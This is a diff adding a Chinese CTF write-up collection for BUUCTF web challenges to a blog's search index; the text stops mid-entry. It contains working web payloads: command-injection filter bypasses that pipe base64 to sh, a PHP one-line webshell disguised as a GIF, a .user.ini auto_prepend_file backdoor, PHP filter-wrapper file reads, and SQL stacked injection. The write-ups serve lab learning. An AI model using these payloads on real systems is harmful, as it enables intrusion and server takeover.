@@ -1,6 +1,256 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUUCTF WP合集</title>
+    <url>/2021/03/02/buuctfwp/</url>
+    <content><![CDATA[<p>此为个人的解题记录，为记录方便，尽量不截图，不复述原题，随时更新。</p>
+<a id="more"></a>
+
+<h2 id="ACTF"><a href="#ACTF" class="headerlink" title="[ACTF]"></a>[ACTF]</h2><h3 id="2020-新生赛-include"><a href="#2020-新生赛-include" class="headerlink" title="2020 新生赛 include"></a>2020 新生赛 include</h3><p>文件包含，利用伪协议base64编码来读取文件源码，得到被注释的flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<hr>
+<h2 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="[BJDCTF]"></a>[BJDCTF]</h2><h3 id="2020-Easy-MD5"><a href="#2020-Easy-MD5" class="headerlink" title="2020 Easy MD5"></a>2020 Easy MD5</h3><p>涉及到一个知识点：</p>
+<p> <code>ffifdyop</code> 这个字符串被 md5 哈希了之后会变成 <code>276f722736c95d99e921722cf9ed621c</code>，这个字符串前几位刚好是<code>‘ or ‘6</code>，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是<code>1 select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p>
+<p>该题GET <code>password=ffifdyop</code>，得到新页面：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>与<code>strcmp()</code>函数原理相同，由于md5函数不能处理数组，导致函数返回Null，两个空值相等。</p>
+<p>所以GET<code>a[]=1&amp;b[]=2</code>，得到新页面：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>同理，换成POST就好。</p>
+<p>还有一个巧妙的绕过方法，可以找出md5值都是两个<code>0e</code>开头的，php里面在做 <code>==</code> 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这样的值有：</span><br><span class="line">QNKCDZO</span><br><span class="line">s155964671a</span><br><span class="line">s1091221200a</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<hr>
+<h2 id="GXYCTF"><a href="#GXYCTF" class="headerlink" title="[GXYCTF]"></a>[GXYCTF]</h2><h3 id="2019-Ping-Ping-Ping"><a href="#2019-Ping-Ping-Ping" class="headerlink" title="2019 Ping Ping Ping"></a>2019 Ping Ping Ping</h3><p>这道题进来只有一个ping命令，输入ip地址正常request。</p>
+<p>后面加个ls，得到有<code>flag.php</code>和<code>index.php</code>两个文件。</p>
+<blockquote>
+<p>Linux ls（英文全拼：list files）命令用于显示指定工作目录下之内容（列出目前工作目录所含之文件及子目录)。</p>
+</blockquote>
+<p>用cat flag.php显示空格被过滤。</p>
+<p>绕过空格的常用方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag.php&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br><span class="line">cat$IFS$9flag.php </span><br><span class="line">cat&lt;flag.php</span><br><span class="line">cat&lt;&gt;flag.php</span><br><span class="line">kg&#x3D;$&#39;\x20flag.php&#39;&amp;&amp;cat$kg</span><br><span class="line">a&#x3D;c;b&#x3D;at;c&#x3D;flag.php;$a$b $c</span><br><span class="line">b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br><span class="line">echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</span><br></pre></td></tr></table></figure>
+
+<p>要是禁用cat的话可以用less、more、tac、ca\t等绕过。</p>
+<p>试了几个，发现flag也被过滤，成功用<code>cat$IFS$9index.php</code>看到了源码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\/?ip=|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>考虑如何来绕过flag，得到以下payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh</span><br><span class="line"><span class="comment">//Y2F0IGZsYWcucGhw是cat flag.php的base64-encode</span></span><br><span class="line"><span class="comment">//base64 -d 就是base64-encode</span></span><br><span class="line"><span class="comment">// |sh就是用sh执行</span></span><br></pre></td></tr></table></figure>
+
+<p>找flag文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1;find &#x2F; -name flag</span><br><span class="line">127.0.0.1;ls ..&#x2F;..&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2020-BackupFile"><a href="#2020-BackupFile" class="headerlink" title="2020 BackupFile"></a>2020 BackupFile</h3><p>备份，<code>index.php.bak</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉。</p>
+<hr>
+<h2 id="HCTF"><a href="#HCTF" class="headerlink" title="[HCTF]"></a>[HCTF]</h2><h3 id="2018-WarmUp"><a href="#2018-WarmUp" class="headerlink" title="2018 WarmUp"></a>2018 WarmUp</h3><p>本题主要在绕过几个if检查。</p>
+<p>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true</p>
+<p>第四个if语句判断先url解码再截取的$page是否存在于$whitelist中，存在则返回true</p>
+<p>所以我们要构造payload来使url解码后仍然是 <code>?</code> 即<code>%253f</code>。</p>
+<p>由于不知道flag文件位置，使用相对路径一个一个尝试，最终得到payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;fa11c443-afb7-4ce7-9b4d-b4d3266118ee.node3.buuoj.cn&#x2F;?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2018-admin"><a href="#2018-admin" class="headerlink" title="2018 admin"></a>2018 admin</h3><blockquote>
+<p>reference：<a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html">https://www.cnblogs.com/chrysanthemum/p/11722351.html</a></p>
+<p>reference：<a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p>
+</blockquote>
+<p>参考上面资料，使用unicode欺骗来获得admin登录权限。</p>
+<p>用下面的网站找到admin：<code>ᴬᴰᴹᴵᴺ</code>，由于该题会将所有结果进行<code>strtolower()</code>来转换成小写，在这样之后<code>ᴬᴰᴹᴵᴺ</code>就会变成<code>admin</code>，从而成功登录。</p>
+<blockquote>
+<p><a href="https://unicode-table.com/en/1D2E/">https://unicode-table.com/en/1D2E/</a></p>
+</blockquote>
+<p>好像预期解是flask session伪造。</p>
+<hr>
+<h2 id="极客大挑战"><a href="#极客大挑战" class="headerlink" title="[极客大挑战]"></a>[极客大挑战]</h2><h3 id="2019-Http"><a href="#2019-Http" class="headerlink" title="2019 Http"></a>2019 Http</h3><p>http请求 headers 中的配置：</p>
+<table>
+<thead>
+<tr>
+<th align="center">headers</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Accept</td>
+<td align="center">指定客户端能够接收的内容类型，内容类型中的先后次序表示客户端接收的先后次序。</td>
+</tr>
+<tr>
+<td align="center">Accept-Language</td>
+<td align="center">指定HTTP客户端浏览器用来展示返回信息所优先选择的语言。</td>
+</tr>
+<tr>
+<td align="center">Accept-Encoding</td>
+<td align="center">指定客户端浏览器所能够支持的返回压缩格式。</td>
+</tr>
+<tr>
+<td align="center">Connection</td>
+<td align="center">表示是否需要持久连接。如果web服务器端看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以减少下载所需要的时间。</td>
+</tr>
+<tr>
+<td align="center">Cookie</td>
+<td align="center">HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
+</tr>
+<tr>
+<td align="center">Host</td>
+<td align="center">请求的web服务器域名地址。</td>
+</tr>
+<tr>
+<td align="center">Referer</td>
+<td align="center">包含一个URL，用户从该URL代表的页面出发访问当前请求的页面服务器端返回HTTP头部信息。</td>
+</tr>
+<tr>
+<td align="center">User-Agent</td>
+<td align="center">HTTP客户端运行的浏览器类型的详细信息。通过该头部信息，web服务器可以判断到当前HTTP请求的客户端浏览器类别。</td>
+</tr>
+</tbody></table>
+<p>页面中发现了<code>secret.php</code>，访问后显示<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;.</code></p>
+<p>所以我们利用python，添加headers来满足要求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;node3.buuoj.cn:25212&#x2F;Secret.php&#39;</span><br><span class="line">headers&#x3D;&#123;&quot;Referer&quot;:&quot;https:&#x2F;&#x2F;www.Sycsecret.com&quot;,&quot;Origin&quot;:&quot;https:&#x2F;&#x2F;www.Sycsecret.com&quot;&#125;</span><br><span class="line">r &#x3D; requests.get(url,headers&#x3D;headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>得到信息：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure>
+
+<p>添加headers：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">headers[&#39;User-Agent&#39;] &#x3D; &quot;Syclover&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">No!!! you can only read this locally!!</span><br></pre></td></tr></table></figure>
+
+<p>伪造本地ip：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">headers[&#39;X-Forwarded-For&#39;] &#x3D; &#39;127.0.0.1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag。</p>
+<h3 id="2019PHP"><a href="#2019PHP" class="headerlink" title="2019PHP"></a>2019PHP</h3><p>私有类还要用python执行才行。</p>
+<p>序列化：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;username = <span class="string">&quot;guests&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = serialize(<span class="keyword">new</span> Name(<span class="string">&quot;admin&quot;</span>,<span class="number">100</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2019-Upload"><a href="#2019-Upload" class="headerlink" title="2019 Upload"></a>2019 Upload</h3><blockquote>
+<p>reference：<a href="https://www.cnblogs.com/yunqian2017/p/13308641.html">https://www.cnblogs.com/yunqian2017/p/13308641.html</a></p>
+</blockquote>
+<p>首先尝试上传，发现限制了文件的后缀名，没法上传<code>.php</code> <code>.php3</code> <code>.php5</code>等php文件，但是这里没有过滤<code>.phtml</code>，这是一个可以用html语法来实现php命令的后缀文件。</p>
+<p>文件内容如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_REQUEST[test])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传会显示<code>It&#39;s not a image at all!</code>，那就在前面加个文件头：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GITF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_REQUEST[test])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把<code>content-type</code>修改为<code>image/jpg</code>。</p>
+<p>离谱的地方在于要盲猜文件保存路径来连接蚁剑，这里是<code>/upload/1.phtml</code>。</p>
+<h3 id="2019-buyflag"><a href="#2019-buyflag" class="headerlink" title="2019 buyflag"></a>2019 buyflag</h3><p>抓包修改<code>user=1</code>；</p>
+<p>POST <code>password=404a</code>（弱比较）</p>
+<p>POST <code>money=100000000</code>，显示太长了</p>
+<p>科学计数法 <code>money=1e9</code>，拿到flag</p>
+<p>或者绕过<code>strcmp()</code>函数，只要我们POST的是一个数组或object：<code>money[]=100000000</code>，即可绕过验证。</p>
+<hr>
+<h2 id="强网杯"><a href="#强网杯" class="headerlink" title="[强网杯]"></a>[强网杯]</h2><h3 id="2019-随便注"><a href="#2019-随便注" class="headerlink" title="2019 随便注"></a>2019 随便注</h3><blockquote>
+<p>reference：<a href="https://www.cnblogs.com/joker-vip/p/12483823.html">https://www.cnblogs.com/joker-vip/p/12483823.html</a></p>
+</blockquote>
+<hr>
+<h2 id="RoarCTF"><a href="#RoarCTF" class="headerlink" title="[RoarCTF ]"></a>[RoarCTF ]</h2><h3 id="2019-Easy-Calc"><a href="#2019-Easy-Calc" class="headerlink" title="2019 Easy Calc"></a>2019 Easy Calc</h3><p>进来是一个计算页面，输入字母会显示错误。源码中找到如下提示：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$(&#x27;#calc&#x27;).submit(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">        type:&#x27;GET&#x27;,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            $(&quot;#result&quot;).html(`<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-success&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">strong</span>&gt;</span>答案:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>$&#123;data&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`);</span><br><span class="line">        &#125;,</span><br><span class="line">        error:function()&#123;</span><br><span class="line">            alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    return false;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>而查阅得知php字符串的解析特性：</p>
+<blockquote>
+<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
+<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
+<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
+</blockquote>
+<p>所以我们构造url：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28751&#x2F;calc.php? num&#x3D;phpinfo()</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28751&#x2F;calc.php? num&#x3D;var_dump(scandir(chr(47)))</span><br><span class="line">&#x2F;&#x2F;scandir()函数	返回指定目录中的文件和目录的数组。</span><br><span class="line">&#x2F;&#x2F;var_dump()函数	显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span><br><span class="line">&#x2F;&#x2F;由于题目将&#39;&#x2F;&#39;过滤了，所以我们用ascii码chr(47)来代替。</span><br></pre></td></tr></table></figure>
+
+<p>查询到f1agg文件。然后构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28751&#x2F;calc.php? num&#x3D;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">&#x2F;&#x2F;file_get_contents() 把整个文件读入一个字符串中。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<hr>
+<h2 id="SUCTF"><a href="#SUCTF" class="headerlink" title="[SUCTF]"></a>[SUCTF]</h2><h3 id="2019-EasySQL"><a href="#2019-EasySQL" class="headerlink" title="2019 EasySQL"></a>2019 EasySQL</h3><p>扫描可得源码，堆叠注入得知flag表。</p>
+<blockquote>
+<p>reference：<a href="https://blog.csdn.net/qq_43678005/article/details/108101904">https://blog.csdn.net/qq_43678005/article/details/108101904</a></p>
+</blockquote>
+<p>因此构造payload：<code>*,1</code> 。</p>
+<p>或者通过堆叠注入，设置 <code>sql_mode</code> 的值为 <code>PIPES_AS_CONCAT</code>，从而将 || 视为字符串的连接操作符而非或运算符,所以构造出来的payload为：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+<h3 id="2019-checkin"><a href="#2019-checkin" class="headerlink" title="2019 checkin"></a>2019 checkin</h3><p>该题为文件上传，这道题的重点在于，要利用<code>.user.ini</code>来使图片格式的文件被php解析。</p>
+<blockquote>
+<p>reference：<a href="https://www.cnblogs.com/wkzb/p/12286324.html">https://www.cnblogs.com/wkzb/p/12286324.html</a></p>
+<p>什么是.user.ini？</p>
+<p>先从php.ini说起，php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。</p>
+<p>模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，和.user.ini中设置。这里就提到了.user.ini，那么这是个什么配置文件？</p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+<p>​    所以可以理解为：.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。</p>
+<p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>然后我们看到php.ini中的配置项，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。不过，我们仍然可以很容易地借助.user.ini文件来构造一个“后门”。</p>
+<p>php配置项中auto_prepend_file具体意思是：指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而配置项中auto_append_file也类似，只是在文件后面包含。</p>
+<p>使用方法很简单，直接写在.user.ini中：</p>
+<p>auto_prepend_file=01.gif</p>
+<p>01.gif是要包含的文件。所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p>
+<p>哪些情况下可以用到这个姿势？</p>
+<p>比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
+</blockquote>
+<p>在这道题中，我们先上传一个<code>.user.ini</code>文件，内容为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;01.gif</span><br></pre></td></tr></table></figure>
+
+<p>然后再上传木马：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;system(&#39;cat &#x2F;flag&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里也可以是一句话木马，连蚁剑。由于该题在上传含有？的文件是会提示不允许含<code>？</code>，所以我们用script来绕过了一下。</p>
+<p>访问文件地址拿到flag。</p>
+<hr>
+<h2 id="ZJCTF"><a href="#ZJCTF" class="headerlink" title="[ZJCTF]"></a>[ZJCTF]</h2><h3 id="2019-NiZhuanSiWei"><a href="#2019-NiZhuanSiWei" class="headerlink" title="2019 NiZhuanSiWei"></a>2019 NiZhuanSiWei</h3><p>主要是伪协议和反序列化。</p>
+<blockquote>
+<p>reference：<a href="https://jiulin.space/2021/01/02/php3/">https://jiulin.space/2021/01/02/php3/</a></p>
+</blockquote>
+<p>题目：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><code>file_get_contents</code>是读取文件中的字符串 ，不能直接GET，一般这种情况下，就要利用到<code>data</code>伪协议来写入文件。可能有过滤，就直接base64编码了。payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>后面这里不能直接读取flag，提示给了<code>uselesss.php</code>，利用<code>php</code>伪协议中的<code>php://filter</code>来读取文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
+
+<p>得到如下代码：</p>
